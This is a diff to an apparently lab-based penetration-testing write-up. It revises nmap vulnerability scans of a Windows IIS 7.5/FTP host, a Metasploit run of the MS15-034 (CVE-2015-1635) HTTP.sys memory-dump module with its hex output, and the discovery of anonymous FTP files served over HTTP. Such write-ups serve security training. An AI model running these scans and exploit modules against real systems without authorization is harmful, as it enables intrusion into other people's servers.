@@ -33,44 +33,21 @@ This is a slightly shorter and alternative method of #5, where we can use msfven
 # Attack
 ## 1. Another Day, Another NMAP
 ```
-hippoeug@kali:~$ nmap -sC -sV -A --script=vuln 10.10.10.5 -v -Pn
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:20 +0
+hippoeug@kali:~$ nmap --script vuln 10.129.123.159 -sC -sV -Pn -v
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 15:04 +08
 ...
-Discovered open port 80/tcp on 10.10.10.5
-Discovered open port 21/tcp on 10.10.10.5
+Scanning 10.129.123.159 [1000 ports]
+Discovered open port 21/tcp on 10.129.123.159
+Discovered open port 80/tcp on 10.129.123.159
 ...
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     Microsoft ftpd
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
 |_sslv2-drown: 
 80/tcp open  http    Microsoft IIS httpd 7.5
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
 |_http-csrf: Couldn't find any CSRF vulnerabilities.
 |_http-dombased-xss: Couldn't find any DOM based XSS.
 |_http-server-header: Microsoft-IIS/7.5
-|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-```
-
-So we know there is a FTP server, and a HTTP server running IIS. Let's KIV.
-Also, I wonder what does the vuln script show?
-```
-hippoeug@kali:~$ nmap --script vuln 10.10.10.5 -Pn -v
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:31 +08
-NSE: Loaded 105 scripts for scanning.
-...
-Discovered open port 21/tcp on 10.10.10.5
-Discovered open port 80/tcp on 10.10.10.5
-Completed Connect Scan at 23:32, 6.36s elapsed (1000 total ports)
-...
-PORT   STATE SERVICE
-21/tcp open  ftp
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-|_sslv2-drown: 
-80/tcp open  http
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-|_http-csrf: Couldn't find any CSRF vulnerabilities.
-|_http-dombased-xss: Couldn't find any DOM based XSS.
 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
 | http-vuln-cve2015-1635: 
 |   VULNERABLE:
@@ -83,16 +60,43 @@ PORT   STATE SERVICE
 |           
 |     Disclosure date: 2015-04-14
 |     References:
-|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
-|_      https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
+|       https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+...
 ```
+So we know there is a FTP server, and a HTTP server running IIS. Let's KIV.
 
 ## 2. First Attack, MS15-034, CVE-2015-1635
 Ezgame, another metasploit module!
 ```
-msf5 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
+hippoeug@kali:~$ msfconsole
+msf6 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
+msf6 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) > show options
 
-+] Memory contents:
+Module options (auxiliary/scanner/http/ms15_034_http_sys_memory_dump):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------                                                                                                           
+   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT             80               yes       The target port (TCP)
+   SSL               false            no        Negotiate SSL/TLS for outgoing connections
+   SUPPRESS_REQUEST  true             yes       Suppress output of the requested resource
+   TARGETURI         /                no        URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)
+   THREADS           1                yes       The number of concurrent threads (max one per host)
+   VHOST                              no        HTTP server virtual host
+
+msf6 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) > set rhost 10.129.128.62
+rhost => 10.129.128.62
+msf6 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) > run
+/usr/share/metasploit-framework/modules/auxiliary/scanner/http/ms15_034_http_sys_memory_dump.rb:67: warning: URI.escape is obsolete
+
+[+] Target may be vulnerable...
+[+] Stand by...
+[-] Memory dump start position not found, dumping all data instead
+
+[+] Memory contents:
 48 54 54 50 2f 31 2e 31 20 32 30 36 20 50 61 72    |HTTP/1.1 206 Par|
 74 69 61 6c 20 43 6f 6e 74 65 6e 74 0d 0a 43 6f    |tial Content..Co|
 6e 74 65 6e 74 2d 54 79 70 65 3a 20 74 65 78 74    |ntent-Type: text|
@@ -105,9 +109,9 @@ msf5 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
 3a 30 22 0d 0a 53 65 72 76 65 72 3a 20 4d 69 63    |:0"..Server: Mic|
 72 6f 73 6f 66 74 2d 49 49 53 2f 37 2e 35 0d 0a    |rosoft-IIS/7.5..|
 58 2d 50 6f 77 65 72 65 64 2d 42 79 3a 20 41 53    |X-Powered-By: AS|
-50 2e 4e 45 54 0d 0a 44 61 74 65 3a 20 4d 6f 6e    |P.NET..Date: Mon|
-2c 20 33 30 20 4e 6f 76 20 32 30 32 30 20 32 33    |, 30 Nov 2020 23|
-3a 33 39 3a 35 32 20 47 4d 54 0d 0a 43 6f 6e 74    |:39:52 GMT..Cont|
+50 2e 4e 45 54 0d 0a 44 61 74 65 3a 20 53 75 6e    |P.NET..Date: Sun|
+2c 20 31 31 20 41 70 72 20 32 30 32 31 20 31 30    |, 11 Apr 2021 10|
+3a 30 31 3a 30 39 20 47 4d 54 0d 0a 43 6f 6e 74    |:01:09 GMT..Cont|
 65 6e 74 2d 4c 65 6e 67 74 68 3a 20 36 38 38 0d    |ent-Length: 688.|
 0a 43 6f 6e 74 65 6e 74 2d 52 61 6e 67 65 3a 20    |.Content-Range: |
 62 79 74 65 73 20 31 2d 36 38 38 2f 36 38 39 0d    |bytes 1-688/689.|
@@ -155,23 +159,30 @@ msf5 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
 31 22 20 2f 3e 3c 2f 61 3e 0d 0a 3c 2f 64 69 76    |1" /></a>..</div|
 3e 0d 0a 3c 2f 62 6f 64 79 3e 0d 0a 3c 2f 68 74    |>..</body>..</ht|
 6d 6c 3e                                           |ml>|
+
+
+[+] Memory dump saved to /home/hippoeug/.msf4/loot/20210411175954_default_10.129.128.62_iis.ms15034_109815.bin
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
 ```
 Ah crap, nothing interesting mang. Back to searching for vulnerabilties.
 
 ## 3. NMAP, Second Attempt
 ```
-hippoeug@kali:~$ nmap -sC -sV 10.10.10.5 -Pn -v
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:44 +08
+hippoeug@kali:~$ nmap  10.129.123.159 -sC -sV -Pn -v
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 15:23 +08
 ...
-Discovered open port 80/tcp on 10.10.10.5
-Discovered open port 21/tcp on 10.10.10.5
+Scanning 10.129.123.159 [1000 ports]
+Discovered open port 80/tcp on 10.129.123.159
+Discovered open port 21/tcp on 10.129.123.159
 ...
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     Microsoft ftpd
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| 03-18-17  01:06AM       <DIR>          aspnet_client
-| 03-17-17  04:37PM                  689 iisstart.htm
-|_03-17-17  04:37PM               184946 welcome.png
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
 | ftp-syst: 
 |_  SYST: Windows_NT
 80/tcp open  http    Microsoft IIS httpd 7.5
@@ -181,6 +192,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Microsoft-IIS/7.5
 |_http-title: IIS7
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+...
 ```
 Going to `http://10.10.10.5`, we see the IIS welcome page.
 Trying `http://10.10.10.5/iisstart.htm` and `http://10.10.10.5/welcome.png` as seen on the FTP server, we get results! 
